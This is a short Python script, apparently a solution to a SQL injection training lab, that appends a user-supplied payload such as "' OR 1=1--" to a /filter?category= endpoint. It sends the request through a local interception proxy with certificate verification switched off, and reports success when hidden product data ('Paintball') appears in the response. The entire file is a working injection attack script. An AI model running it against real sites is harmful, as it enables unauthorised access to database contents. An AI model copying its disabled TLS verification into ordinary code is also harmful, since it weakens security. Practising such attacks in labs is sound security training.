import argparse
import sys
import urllib3
import requests


def disable_ssl_warnings():
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_proxy_config():
    return {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }


def validate_proxy_or_exit(proxies):
    if not is_proxy_available(proxies):
        print("(-) Proxy unreachable at 127.0.0.1:8080.")
        print("    ➤ Start Proxy Server or disable proxy in the script.")
        sys.exit(1)


def is_proxy_available(proxies):
    test_url = "http://example.com"
    try:
        requests.get(test_url, proxies=proxies, timeout=3)
        return True
    except requests.RequestException:
        return False


def get_cli_args():
    parser = argparse.ArgumentParser(
        description=(
            "Scenario: Retrieve hidden data from a vulnerable endpoint.\n\n"
            "Example:\n"
            "  python3 retrieveHiddenData.py https://vulnerable-site.com \"' OR 1=1--\""
        ),
        formatter_class=argparse.RawTextHelpFormatter
    )

    parser.add_argument(
        "url", help="Target URL (e.g., https://vulnerable-site.com)")
    parser.add_argument(
        "payload", help="SQL injection payload (e.g., \"' OR 1=1--\")")

    return parser.parse_args()


def attempt_sql_injection(base_url, payload, proxies):
    endpoint = "/filter?category="
    full_url = f"{base_url}{endpoint}{payload}"

    print(f"\n(+) Targeting: {base_url}")
    print(f"(+) Endpoint: {endpoint}")
    print(f"(+) Testing payload: {payload}")
    print(f"(+) Full request URL: {full_url}\n\n")

    if is_injection_successful(full_url, proxies):
        print("[+] SQL injection successful!")
    else:
        print("[-] SQL injection unsuccessful!")


def is_injection_successful(full_url, proxies):
    try:
        response = requests.get(full_url, verify=False, proxies=proxies)
        return "Paintball" in response.text
    except requests.RequestException as err:
        print(f"(-) Request failed: {err}")
        return False


def main():
    try:
        disable_ssl_warnings()
        proxies = get_proxy_config()
        validate_proxy_or_exit(proxies)

        args = get_cli_args()
        attempt_sql_injection(args.url, args.payload, proxies)
    except Exception as err:
        print(f"(-) Unexpected error: {err}")
        sys.exit(1)


if __name__ == "__main__":
    main()
